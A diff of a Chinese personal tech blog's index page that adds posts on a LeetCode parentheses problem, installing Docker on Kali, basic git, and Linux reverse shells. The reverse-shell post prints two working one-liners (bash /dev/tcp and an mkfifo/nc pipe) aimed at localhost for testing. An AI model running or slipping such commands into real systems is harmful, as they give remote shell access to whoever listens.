@@ -118,7 +118,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">9</span></a>
 
   </li>
   </ul>
@@ -144,6 +144,349 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/10/10/leetcode-856-%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%86%E6%95%B0-%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E5%AE%9A%E4%B9%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/10/10/leetcode-856-%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%86%E6%95%B0-%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E5%AE%9A%E4%B9%89/" class="post-title-link" itemprop="url">leetcode 856. 括号的分数 简单的语法制导定义</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-10-10 00:08:02 / 修改时间：00:20:23" itemprop="dateCreated datePublished" datetime="2022-10-10T00:08:02+08:00">2022-10-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/score-of-parentheses/">leetcode 原题地址</a></p>
+<p>题目如下</p>
+<p><img src="../images/leetcode-856-%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%86%E6%95%B0-%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E5%AE%9A%E4%B9%89/2022-10-10-00-11-06-image.png"><img src="../images/leetcode-856-%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%88%86%E6%95%B0-%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%AD%E6%B3%95%E5%88%B6%E5%AF%BC%E5%AE%9A%E4%B9%89/2022-10-10-00-11-28-image.png"></p>
+<h1 id="使用编译原理的方法"><a href="#使用编译原理的方法" class="headerlink" title="使用编译原理的方法"></a>使用编译原理的方法</h1><p>简单的自底向上分析和语法制导定义</p>
+<p>E1 E2 都是 E，只是为了区分在产生式中的位置</p>
+<p>因为文法很简单，所以没有像学编译原理时那么复杂（也忘得差不多了）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 自底向上分析</span></span><br><span class="line"><span class="comment">产生式             语义动作</span></span><br><span class="line"><span class="comment">E -&gt; (E1)       # E.val = E1.val * 2</span></span><br><span class="line"><span class="comment">E -&gt; ()         # E.val = 1</span></span><br><span class="line"><span class="comment">E -&gt; E1 E2      # E.val = E1.val + E2.val</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">( 移入</span></span><br><span class="line"><span class="comment">) 规约</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> sym;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">&#125;Token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">scoreOfParentheses</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    Token <span class="built_in">stack</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(; *s; s++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*s == <span class="string">&#x27;(&#x27;</span>)&#123;  <span class="comment">// shift</span></span><br><span class="line">            top++;</span><br><span class="line">            <span class="built_in">stack</span>[top].sym = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(*s == <span class="string">&#x27;)&#x27;</span>)&#123;  <span class="comment">// reduce</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">stack</span>[top].sym == <span class="string">&#x27;(&#x27;</span>)&#123;  <span class="comment">// E -&gt; ()</span></span><br><span class="line">                <span class="built_in">stack</span>[top].sym = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">                <span class="built_in">stack</span>[top].val = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;  <span class="comment">// E -&gt; (E1)</span></span><br><span class="line">                <span class="built_in">stack</span>[top - <span class="number">1</span>].sym = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">                <span class="built_in">stack</span>[top - <span class="number">1</span>].val = <span class="built_in">stack</span>[top].val * <span class="number">2</span>;</span><br><span class="line">                top--;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// E -&gt; E1 E2</span></span><br><span class="line">            <span class="comment">// 判断是否可以继续规约</span></span><br><span class="line">            <span class="keyword">if</span>(top &gt;= <span class="number">1</span> &amp;&amp; <span class="built_in">stack</span>[top - <span class="number">1</span>].sym == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">                <span class="built_in">stack</span>[top - <span class="number">1</span>].val += <span class="built_in">stack</span>[top].val;</span><br><span class="line">                top--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>[<span class="number">0</span>].val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/05/03/docker%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/03/docker%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">docker的简单使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-03 21:17:11 / 修改时间：22:53:36" itemprop="dateCreated datePublished" datetime="2022-05-03T21:17:11+08:00">2022-05-03</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="kali-中安装-docker"><a href="#kali-中安装-docker" class="headerlink" title="kali 中安装 docker"></a>kali 中安装 docker</h1><h2 id="apt安装"><a href="#apt安装" class="headerlink" title="apt安装"></a>apt安装</h2><p>docker官网并没有在kali上面安装docker的指南，但是有 debian的，不过在kali上有点小问题。直接用apt装，用一段时间再说。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
+
+<p>使用apt搜索docker开头的软件包，有个包就叫docker，但装完之后没什么反应，docker.io应该是最重要的，还能找到一些插件，比如docker-compose</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt search docker | grep ^docker</span><br></pre></td></tr></table></figure>
+
+<h2 id="docker官网指南，在debian上安装docker"><a href="#docker官网指南，在debian上安装docker" class="headerlink" title="docker官网指南，在debian上安装docker"></a>docker官网指南，在debian上安装docker</h2><p>docker官网有给安装的命令 <a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/debian/%EF%BC%88kali%E6%98%AF%E5%9F%BA%E4%BA%8Edebian%E7%9A%84%EF%BC%89">https://docs.docker.com/engine/install/debian/（kali是基于debian的）</a></p>
+<p>docker官网上，把docker，docker.io等 称为 old versions，所以要先删除旧版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>
+
+<p>然后设置仓库，应该指的是apt的仓库。update更新的是apt的索引，upgrade是更新软件，有些软件包kali应该已经安装过了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>
+
+<p>然后获取公钥</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>
+
+<p>然后就是出问题的一步</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo \</span><br><span class="line">  &quot;deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian \</span><br><span class="line"><span class="meta">  $</span><span class="bash">(lsb_release -cs) stable<span class="string">&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span></span></span><br></pre></td></tr></table></figure>
+
+<p><code>lsb_release -cs</code> 运行结果应该是 debian的版本名，比如buster、stretch这种，但是在 kali 上，运行结果是<code>kali-rolling</code> 所以就出问题了</p>
+<p>在kali中查看debian的版本</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
+
+<p>换成对应的版本名字应该就可以了，然后用apt安装docker</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>
+
+<p>没有真正运行这种方法，到出问题的那一步寄了，所以直接安装了docker.io</p>
+<h2 id="一些小问题"><a href="#一些小问题" class="headerlink" title="一些小问题"></a>一些小问题</h2><p>docker.io 说是旧版本，但我看他版本号挺高的，网上找到一种说法，说是docker.io是debian团队维护的，docker-ce是docker官方维护的</p>
+<p>apt中查看docker.io的信息，可以看到维护团队的信息</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Maintainer:</span> Debian Go Packaging Team &lt;team+pkg-go@tracker.debian<span class="meta">.org</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>为什么不在windows上装</p>
+<p>windows家庭版不会开hyper-v</p>
+<p>以前hyper-v好像和vmware冲突，只能用选一个，vmware比较重要。但是网上有消息说现在已经解决了</p>
+<h2 id="docker镜像加速"><a href="#docker镜像加速" class="headerlink" title="docker镜像加速"></a>docker镜像加速</h2><p>参考资料 <a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-mirror-acceleration.html">https://www.runoob.com/docker/docker-mirror-acceleration.html</a></p>
+<p>网上看到四个国内加速服务，阿里云的要注册账号，懒，中科大的直接访问302了</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">科大镜像：http<span class="variable">s:</span>//docker.mirrors.ustc.edu.<span class="keyword">cn</span>/</span><br><span class="line">网易：http<span class="variable">s:</span>//hub-mirror.<span class="keyword">c</span>.<span class="number">163</span>.<span class="keyword">com</span>/</span><br><span class="line">阿里云：http<span class="variable">s:</span>//&lt;你的ID&gt;.mirror.aliyuncs.<span class="keyword">com</span></span><br><span class="line">七牛云加速器：http<span class="variable">s:</span>//<span class="keyword">reg</span>-mirror.qiniu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在/etc/docker/daemon.json中加入如下配置（文件不存在就新建）</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;registry-mirrors&quot;</span>:[<span class="string">&quot;https://hub-mirror.c.163.com&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重启服务</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="尝试运行容器"><a href="#尝试运行容器" class="headerlink" title="尝试运行容器"></a>尝试运行容器</h1><p>直接运行docker，不带参数，就可以看到提示信息</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span></span><br></pre></td></tr></table></figure>
+
+<p>docker很多操作好像都要root权限，所以直接切换到root用户，不然很多指令前面都要加<code>sudo</code></p>
+<p>经典hello world，如果本地找不到镜像（image），docker会自动到仓库中寻找并下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<p>docker hub的网址 <a target="_blank" rel="noopener" href="https://hub.docker.com/%EF%BC%8C%E4%B8%8A%E9%9D%A2%E5%8F%AF%E4%BB%A5%E6%9F%A5%E6%89%BE%E9%95%9C%E5%83%8F">https://hub.docker.com/，上面可以查找镜像</a></p>
+<p>运行ubuntu的container，加上 <code>-it</code> 就可以交互了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu bash</span><br></pre></td></tr></table></figure>
+
+<p>也可以指定ubuntu的版本，不指定的话是latest最新版</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu:20.04 bash</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="查看container、image"><a href="#查看container、image" class="headerlink" title="查看container、image"></a>查看container、image</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker container ls</span><br><span class="line">docker container ls -a  # 可以看到已经停止的容器</span><br><span class="line"></span><br><span class="line">docker image ls</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br><span class="line"></span><br><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/05/01/linux%E5%8F%8D%E5%90%91shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/01/linux%E5%8F%8D%E5%90%91shell/" class="post-title-link" itemprop="url">linux反向shell</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-01 14:19:17 / 修改时间：15:43:15" itemprop="dateCreated datePublished" datetime="2022-05-01T14:19:17+08:00">2022-05-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>反向shell，也可以叫反弹shell<br>metasploit中的payload，如果名字里有reverse，就是反向shell</p>
+<h1 id="文件描述符及重定向"><a href="#文件描述符及重定向" class="headerlink" title="文件描述符及重定向"></a>文件描述符及重定向</h1><p>文件描述符重定向原理参考<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">Linux 反弹shell（二）反弹shell的本质</a></p>
+<p>文件描述符（file descriptor），用来表示一个文件，c语言中open函数执行成功，返回值就是一个文件描述符，类型是int，从0开始递增。大致就是用一个数字表示一个文件</p>
+<p>0，1，2分别表示，标准输入，标准输出，标准错误输出</p>
+<h1 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h1><h1 id="dev-tcp-host-port"><a href="#dev-tcp-host-port" class="headerlink" title="/dev/tcp/host/port"></a>/dev/tcp/host/port</h1><p>应该是bash的特性，原理参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/DaoDivDiFang/article/details/106899847">https://blog.csdn.net/DaoDivDiFang/article/details/106899847</a></p>
+<p>在kali（图形化桌面为KDE）中，zsh和dash无法成功</p>
+<p>bash和zsh版本如下，dash版本不知道怎么查看</p>
+<p><img src="/images/linux%E5%8F%8D%E5%90%91shell/image-20220501152930003.png" alt="image-20220501152930003"></p>
+<p>测试命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/54321 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>bash中测试，可以使用</p>
+<p><img src="/images/linux%E5%8F%8D%E5%90%91shell/image-20220501153405910.png" alt="image-20220501153405910"></p>
+<p>zsh中测试，失败</p>
+<p><img src="/images/linux%E5%8F%8D%E5%90%91shell/image-20220501153551076.png" alt="image-20220501153551076"></p>
+<p>dash中测试，失败</p>
+<p><img src="/images/linux%E5%8F%8D%E5%90%91shell/image-20220501153650349.png" alt="image-20220501153650349"></p>
+<p>高版本的ubuntu中，默认shell为dash</p>
+<h1 id="netcat无-e-c-反向shell"><a href="#netcat无-e-c-反向shell" class="headerlink" title="netcat无 -e -c 反向shell"></a>netcat无 -e -c 反向shell</h1><p>-c 表示用 /bin/sh 执行命令</p>
+<p>-e 表示运行程序</p>
+<p>有些版本的netcat没有这两个选项（出于安全性考虑）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 54321 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>取自开头那篇参考文章，ctrl+c退出</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/04/28/git%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/28/git%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" class="post-title-link" itemprop="url">git的简单使用</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-28 23:17:34 / 修改时间：23:39:16" itemprop="dateCreated datePublished" datetime="2022-04-28T23:17:34+08:00">2022-04-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Git <span class="keyword">is</span> a free <span class="keyword">and</span> <span class="keyword">open</span> source distributed <span class="keyword">version</span> control <span class="keyword">system</span> designed <span class="keyword">to</span> handle everything <span class="keyword">from</span> small <span class="keyword">to</span> very <span class="keyword">large</span> projects <span class="keyword">with</span> speed <span class="keyword">and</span> efficiency.</span><br></pre></td></tr></table></figure>
+
+<p>git是一个免费且开源的分布式版本控制系统</p>
+<p><a target="_blank" rel="noopener" href="https://git-scm.com/">git官网</a>上提供了文档，以及免费阅读的书籍，git更具体的用法可以去查看文档，本文只涉及简单的用法</p>
+<p>清华大学镜像，git下载地址<a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/">https://mirrors.tuna.tsinghua.edu.cn/github-release/git-for-windows/git/</a></p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>操作系统：win 10</p>
+<p>git版本：</p>
+<p><img src="/images/git%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20220428233100934.png" alt="image-20220428233100934"></p>
+<p>shell： git bash</p>
+<h1 id="初始化仓库-git-init"><a href="#初始化仓库-git-init" class="headerlink" title="初始化仓库 git init"></a>初始化仓库 git init</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="meta">#</span><span class="bash"> git-init - Create an empty Git repository or reinitialize an existing one</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/git%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20220428233047027.png" alt="image-20220428233047027"></p>
+<h1 id="git-reflog"><a href="#git-reflog" class="headerlink" title="git reflog"></a>git reflog</h1><p>可以往前切换版本</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1421,7 +1764,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-22 23:41:32" itemprop="dateModified" datetime="2022-04-22T23:41:32+08:00">2022-04-22</time>
+                <time title="修改时间：2022-08-20 02:00:32" itemprop="dateModified" datetime="2022-08-20T02:00:32+08:00">2022-08-20</time>
               </span>
 
           
@@ -1474,7 +1817,7 @@
 <p>如 x4297.github.io</p>
 <p>之后访问博客就访问 <a href="https://x4297.github.io/">https://x4297.github.io</a></p>
 <p>安装 hexo-deployer-git</p>
-<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer.git <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git <span class="comment">--save</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -1695,7 +2038,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
